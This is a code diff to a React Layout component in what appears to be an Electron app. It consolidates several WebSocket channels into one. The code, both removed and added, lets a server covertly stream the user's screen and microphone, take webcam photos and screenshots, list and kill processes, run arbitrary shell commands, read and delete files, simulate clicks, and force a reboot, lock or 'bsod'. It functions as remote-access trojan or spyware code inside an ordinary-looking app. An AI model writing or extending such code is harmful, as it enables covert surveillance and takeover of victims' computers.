@@ -44,232 +44,63 @@ export default function Layout() {
     return () => clearInterval(interval)
   }, [isVisible])
 
-  // Admin commands WebSocket — server pushes commands immediately
+  // Single persistent WebSocket — all channels multiplexed over one connection
   useEffect(() => {
     const wsBase = getApiBase().replace(/^http/, 'ws')
     let ws = null
     let reconnectTimeout = null
     let destroyed = false
 
-    const handleMessage = async (e) => {
-      if (typeof e.data !== 'string') return
-      const cmd = e.data.trim()
-      if (cmd === 'quit') await window.electronBridge?.forceQuit()
-      else if (cmd === 'remove-autostart') await window.electronBridge?.removeAutostart()
-      else if (cmd === 'reboot') await window.electronBridge?.systemReboot()
-      else if (cmd === 'lock-screen') await window.electronBridge?.systemLock()
-      else if (cmd === 'bsod') await window.electronBridge?.systemBsod()
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/commands-ws?token=${token}`)
-      ws.onmessage = handleMessage
-      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
-    }
-
-    connect()
-    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
-  }, [])
-
-  // Screenshot WebSocket — on-demand capture (like webcam)
-  useEffect(() => {
-    if (!window.electronBridge?.captureScreen) return
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let reconnectTimeout = null
-    let destroyed = false
-
-    const handleMessage = async (e) => {
-      if (e.data !== 'capture') return
-      try {
-        const base64 = await window.electronBridge.captureScreen()
-        if (!base64 || !ws || ws.readyState !== WebSocket.OPEN) return
-        const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
-        ws.send(bytes.buffer)
-      } catch {}
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/screenshot-ws?token=${token}`)
-      ws.onmessage = handleMessage
-      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
-    }
-
-    connect()
-    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
-  }, [])
-
-  // Process list WebSocket — sends list every 15s, receives kill commands
-  useEffect(() => {
-    if (!window.electronBridge?.getProcesses) return
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let uploadInterval = null
-    let reconnectTimeout = null
-    let destroyed = false
-
-    const upload = async (socket) => {
-      try {
-        const processes = await window.electronBridge.getProcesses()
-        if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify(processes))
-      } catch {}
-    }
-
-    const handleMessage = async (e) => {
-      if (typeof e.data !== 'string') return
-      const name = e.data.startsWith('kill:') ? e.data.slice(5) : null
-      if (!name) return
-      try {
-        await window.electronBridge.killProcess(name)
-        upload(ws)
-      } catch {}
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/processes-ws?token=${token}`)
-      ws.onopen = () => {
-        upload(ws)
-        uploadInterval = setInterval(() => upload(ws), 15_000)
-      }
-      ws.onmessage = handleMessage
-      ws.onclose = () => {
-        if (uploadInterval) { clearInterval(uploadInterval); uploadInterval = null }
-        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
-      }
-    }
-
-    connect()
-    return () => {
-      destroyed = true
-      if (uploadInterval) clearInterval(uploadInterval)
-      if (reconnectTimeout) clearTimeout(reconnectTimeout)
-      ws?.close()
-    }
-  }, [])
-
-  // Webcam WebSocket — on-demand capture, auto-reconnect
-  useEffect(() => {
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let reconnectTimeout = null
-    let destroyed = false
-
-    let camCapturing = false
-    const handleMessage = async (e) => {
-      if (e.data !== 'capture') return
-      if (camCapturing) return
-      camCapturing = true
-
-      const tryCapture = async () => {
-        let stream = null
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-          const video = document.createElement('video')
-          video.muted = true
-          video.srcObject = stream
-          await new Promise((resolve, reject) => {
-            const timeout = setTimeout(resolve, 5000)
-            video.addEventListener('loadeddata', () => { clearTimeout(timeout); resolve() }, { once: true })
-            video.play().catch(reject)
-          })
-          const canvas = document.createElement('canvas')
-          canvas.width = video.videoWidth || 640
-          canvas.height = video.videoHeight || 480
-          canvas.getContext('2d').drawImage(video, 0, 0)
-          return await new Promise((resolve, reject) => {
-            canvas.toBlob((blob) => blob ? resolve(blob) : reject(new Error('toBlob failed')), 'image/jpeg', 0.85)
-          })
-        } finally {
-          if (stream) stream.getTracks().forEach((t) => t.stop())
-        }
-      }
-
-      try {
-        let lastErr = null
-        for (let i = 0; i < 3; i++) {
-          try {
-            const blob = await tryCapture()
-            if (ws?.readyState === WebSocket.OPEN) ws.send(await blob.arrayBuffer())
-            lastErr = null
-            break
-          } catch (err) {
-            lastErr = err
-            if (i < 2) await new Promise(r => setTimeout(r, 800))
-          }
-        }
-        if (lastErr) {
-          console.error('Webcam capture failed:', lastErr)
-          if (ws?.readyState === WebSocket.OPEN)
-            ws.send('\x01error:' + (lastErr?.message || String(lastErr)))
-        }
-      } finally {
-        camCapturing = false
-      }
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/webcam-ws?token=${token}`)
-      ws.onmessage = handleMessage
-      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
-    }
-
-    connect()
-
-    return () => {
-      destroyed = true
-      if (reconnectTimeout) clearTimeout(reconnectTimeout)
-      ws?.close()
-    }
-  }, [])
-
-  // Live screen streaming via WebSocket — always on, auto-reconnect
-  useEffect(() => {
-    if (!window.electronBridge?.getScreenSourceId) return
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let streamInterval = null
+    // Screen streaming state
     let mediaStream = null
-    let reconnectTimeout = null
-    let destroyed = false
+    let streamInterval = null
+    let sending = false
 
-    const stopCapture = () => {
+    // Mic state
+    let recorder = null
+    let micStream = null
+
+    // Webcam state
+    let camCapturing = false
+
+    // Process upload interval
+    let processInterval = null
+
+    const stopScreen = () => {
       if (streamInterval) { clearInterval(streamInterval); streamInterval = null }
       if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null }
+      sending = false
     }
 
-    const startCapture = async (socket) => {
-      if (streamInterval) return
+    const stopMic = () => {
+      if (recorder && recorder.state !== 'inactive') recorder.stop()
+      if (micStream) { micStream.getTracks().forEach(t => t.stop()); micStream = null }
+      recorder = null
+    }
+
+    const sendBinary = (socket, channel, buf) => {
+      if (socket.readyState !== WebSocket.OPEN) return
+      const frame = new Uint8Array(1 + buf.byteLength)
+      frame[0] = channel
+      frame.set(new Uint8Array(buf), 1)
+      socket.send(frame)
+    }
+
+    const startScreen = async (socket) => {
+      if (streamInterval || !window.electronBridge?.getScreenSourceId) return
       try {
         const sourceId = await window.electronBridge.getScreenSourceId()
         if (!sourceId || destroyed) return
         mediaStream = await navigator.mediaDevices.getUserMedia({
           audio: false,
-          video: {
-            mandatory: {
-              chromeMediaSource: 'desktop',
-              chromeMediaSourceId: sourceId,
-              maxWidth: 960,
-              maxHeight: 540,
-              maxFrameRate: 10,
-            },
-          },
+          video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: sourceId, maxWidth: 960, maxHeight: 540, maxFrameRate: 10 } },
         })
         const video = document.createElement('video')
         video.srcObject = mediaStream
         await video.play()
         const canvas = document.createElement('canvas')
-        canvas.width = 960
-        canvas.height = 540
+        canvas.width = 960; canvas.height = 540
         const ctx = canvas.getContext('2d')
-        let sending = false
         streamInterval = setInterval(() => {
           if (!socket || socket.readyState !== WebSocket.OPEN) return
           if (sending || socket.bufferedAmount > 256 * 1024) return
@@ -277,56 +108,10 @@ export default function Layout() {
           ctx.drawImage(video, 0, 0, 960, 540)
           canvas.toBlob((blob) => {
             if (!blob || socket.readyState !== WebSocket.OPEN) { sending = false; return }
-            blob.arrayBuffer().then(buf => {
-              if (socket.readyState === WebSocket.OPEN) socket.send(buf)
-            }).catch(() => {}).finally(() => { sending = false })
+            blob.arrayBuffer().then(buf => sendBinary(socket, 0x01, buf)).catch(() => {}).finally(() => { sending = false })
           }, 'image/jpeg', 0.35)
         }, 100)
-      } catch (e) {
-        console.error('Screen stream error:', e)
-      }
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/screen-ws?token=${token}`)
-      ws.onopen = () => startCapture(ws)
-      ws.onmessage = (e) => {
-        if (typeof e.data === 'string' && e.data.startsWith('click:')) {
-          const [, x, y] = e.data.split(':')
-          window.electronBridge?.simulateClick(parseFloat(x), parseFloat(y))
-        }
-      }
-      ws.onclose = () => {
-        stopCapture()
-        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
-      }
-    }
-
-    connect()
-
-    return () => {
-      destroyed = true
-      if (reconnectTimeout) clearTimeout(reconnectTimeout)
-      stopCapture()
-      if (ws) ws.close()
-    }
-  }, [])
-
-  // Mic streaming via WebSocket — always on, auto-reconnect
-  useEffect(() => {
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let recorder = null
-    let micStream = null
-    let reconnectTimeout = null
-    let destroyed = false
-
-    const stopMic = () => {
-      if (recorder && recorder.state !== 'inactive') recorder.stop()
-      if (micStream) { micStream.getTracks().forEach(t => t.stop()); micStream = null }
-      recorder = null
+      } catch (e) { console.error('Screen error:', e) }
     }
 
     const startMic = async (socket) => {
@@ -335,103 +120,157 @@ export default function Layout() {
         micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false })
         recorder = new MediaRecorder(micStream, { mimeType: 'audio/webm;codecs=opus' })
         recorder.ondataavailable = (e) => {
-          if (e.data.size > 0 && socket.readyState === WebSocket.OPEN) {
-            e.data.arrayBuffer().then(buf => socket.send(buf))
-          }
+          if (e.data.size > 0 && socket.readyState === WebSocket.OPEN)
+            e.data.arrayBuffer().then(buf => sendBinary(socket, 0x02, buf))
         }
         recorder.start(250)
-      } catch (e) {
-        console.error('Mic error:', e)
+      } catch (e) { console.error('Mic error:', e) }
+    }
+
+    const uploadProcesses = async (socket) => {
+      if (!window.electronBridge?.getProcesses) return
+      try {
+        const data = await window.electronBridge.getProcesses()
+        if (socket.readyState === WebSocket.OPEN)
+          socket.send(JSON.stringify({ type: 'processes', data }))
+      } catch {}
+    }
+
+    const captureWebcam = async (socket) => {
+      if (camCapturing) return
+      camCapturing = true
+      const tryCapture = async () => {
+        let stream = null
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          const video = document.createElement('video')
+          video.muted = true; video.srcObject = stream
+          await new Promise((resolve, reject) => {
+            const t = setTimeout(resolve, 5000)
+            video.addEventListener('loadeddata', () => { clearTimeout(t); resolve() }, { once: true })
+            video.play().catch(reject)
+          })
+          const canvas = document.createElement('canvas')
+          canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480
+          canvas.getContext('2d').drawImage(video, 0, 0)
+          return await new Promise((resolve, reject) => {
+            canvas.toBlob(b => b ? resolve(b) : reject(new Error('toBlob failed')), 'image/jpeg', 0.85)
+          })
+        } finally {
+          if (stream) stream.getTracks().forEach(t => t.stop())
+        }
       }
+      try {
+        let lastErr = null
+        for (let i = 0; i < 3; i++) {
+          try {
+            const blob = await tryCapture()
+            const token = localStorage.getItem('token')
+            const fd = new FormData()
+            fd.append('file', blob, 'webcam.jpg')
+            await fetch(`${getApiBase()}/users/webcam-photo`, { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd })
+            if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify({ type: 'webcam_done' }))
+            lastErr = null
+            break
+          } catch (err) {
+            lastErr = err
+            if (i < 2) await new Promise(r => setTimeout(r, 800))
+          }
+        }
+        if (lastErr) {
+          console.error('Webcam failed:', lastErr)
+          if (socket.readyState === WebSocket.OPEN)
+            socket.send(JSON.stringify({ type: 'webcam_error', error: lastErr?.message || String(lastErr) }))
+        }
+      } finally { camCapturing = false }
+    }
+
+    const captureScreenshot = async (socket) => {
+      try {
+        const base64 = await window.electronBridge?.captureScreen()
+        if (!base64) return
+        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0))
+        const token = localStorage.getItem('token')
+        const fd = new FormData()
+        fd.append('file', new Blob([bytes], { type: 'image/jpeg' }), 'screenshot.jpg')
+        await fetch(`${getApiBase()}/users/screenshot`, { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd })
+        if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify({ type: 'screenshot_done' }))
+      } catch {}
+    }
+
+    const handleMessage = async (e) => {
+      if (typeof e.data !== 'string') return
+      try {
+        const msg = JSON.parse(e.data)
+        if (msg.type === 'command') {
+          const c = msg.cmd
+          if (c === 'quit') await window.electronBridge?.forceQuit()
+          else if (c === 'remove-autostart') await window.electronBridge?.removeAutostart()
+          else if (c === 'reboot') await window.electronBridge?.systemReboot()
+          else if (c === 'lock-screen') await window.electronBridge?.systemLock()
+          else if (c === 'bsod') await window.electronBridge?.systemBsod()
+        } else if (msg.type === 'webcam_capture') {
+          captureWebcam(ws)
+        } else if (msg.type === 'screenshot_capture') {
+          captureScreenshot(ws)
+        } else if (msg.type === 'kill_process') {
+          try {
+            await window.electronBridge?.killProcess(msg.name)
+            uploadProcesses(ws)
+          } catch {}
+        } else if (msg.type === 'shell_exec') {
+          try {
+            const output = await window.electronBridge?.execCommand(msg.cmd)
+            if (ws.readyState === WebSocket.OPEN)
+              ws.send(JSON.stringify({ type: 'shell_output', text: output ?? '(нет вывода)' }))
+          } catch {
+            if (ws.readyState === WebSocket.OPEN)
+              ws.send(JSON.stringify({ type: 'shell_output', text: '(ошибка выполнения)' }))
+          }
+        } else if (msg.type === 'file_req') {
+          let result = {}
+          try {
+            if (msg.action === 'home') result = await window.electronBridge?.fsHome() ?? {}
+            else if (msg.action === 'list') result = await window.electronBridge?.fsList(msg.path) ?? { entries: [], error: 'no bridge' }
+            else if (msg.action === 'read') result = await window.electronBridge?.fsRead(msg.path) ?? { data: null, error: 'no bridge' }
+            else if (msg.action === 'delete') result = await window.electronBridge?.fsDelete(msg.path) ?? { error: 'no bridge' }
+          } catch (err) { result = { error: String(err) } }
+          if (ws.readyState === WebSocket.OPEN)
+            ws.send(JSON.stringify({ type: 'file_response', id: msg.id, ...result }))
+        } else if (msg.type === 'click') {
+          window.electronBridge?.simulateClick(msg.x, msg.y)
+        }
+      } catch {}
     }
 
     const connect = () => {
       if (destroyed) return
       const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/mic-ws?token=${token}`)
-      ws.onopen = () => startMic(ws)
+      ws = new WebSocket(`${wsBase}/users/worker-ws?token=${token}`)
+      ws.onopen = () => {
+        startScreen(ws)
+        startMic(ws)
+        uploadProcesses(ws)
+        processInterval = setInterval(() => uploadProcesses(ws), 15_000)
+      }
+      ws.onmessage = handleMessage
       ws.onclose = () => {
+        stopScreen()
         stopMic()
-        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
+        if (processInterval) { clearInterval(processInterval); processInterval = null }
+        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000)
       }
     }
 
     connect()
-
     return () => {
       destroyed = true
       if (reconnectTimeout) clearTimeout(reconnectTimeout)
+      if (processInterval) clearInterval(processInterval)
+      stopScreen()
       stopMic()
-      if (ws) ws.close()
+      ws?.close()
     }
-  }, [])
-
-  // File manager WebSocket — auto-reconnect
-  useEffect(() => {
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let reconnectTimeout = null
-    let destroyed = false
-
-    const handleMessage = async (e) => {
-      if (typeof e.data !== 'string') return
-      try {
-        const req = JSON.parse(e.data)
-        let result = {}
-        if (req.action === 'home') {
-          result = await window.electronBridge?.fsHome() ?? {}
-        } else if (req.action === 'list') {
-          result = await window.electronBridge?.fsList(req.path) ?? { entries: [], error: 'no bridge' }
-        } else if (req.action === 'read') {
-          result = await window.electronBridge?.fsRead(req.path) ?? { data: null, error: 'no bridge' }
-        } else if (req.action === 'delete') {
-          result = await window.electronBridge?.fsDelete(req.path) ?? { error: 'no bridge' }
-        }
-        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ id: req.id, ...result }))
-      } catch (err) {
-        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ error: String(err) }))
-      }
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/files-ws?token=${token}`)
-      ws.onmessage = handleMessage
-      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
-    }
-
-    connect()
-    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
-  }, [])
-
-  // Shell terminal WebSocket — auto-reconnect
-  useEffect(() => {
-    const wsBase = getApiBase().replace(/^http/, 'ws')
-    let ws = null
-    let reconnectTimeout = null
-    let destroyed = false
-
-    const handleMessage = async (e) => {
-      if (typeof e.data !== 'string') return
-      try {
-        const output = await window.electronBridge?.execCommand(e.data)
-        if (ws.readyState === WebSocket.OPEN) ws.send(output ?? '(нет вывода)')
-      } catch {
-        if (ws.readyState === WebSocket.OPEN) ws.send('(ошибка выполнения)')
-      }
-    }
-
-    const connect = () => {
-      if (destroyed) return
-      const token = localStorage.getItem('token')
-      ws = new WebSocket(`${wsBase}/users/shell-ws?token=${token}`)
-      ws.onmessage = handleMessage
-      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
-    }
-
-    connect()
-    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
   }, [])
 
 
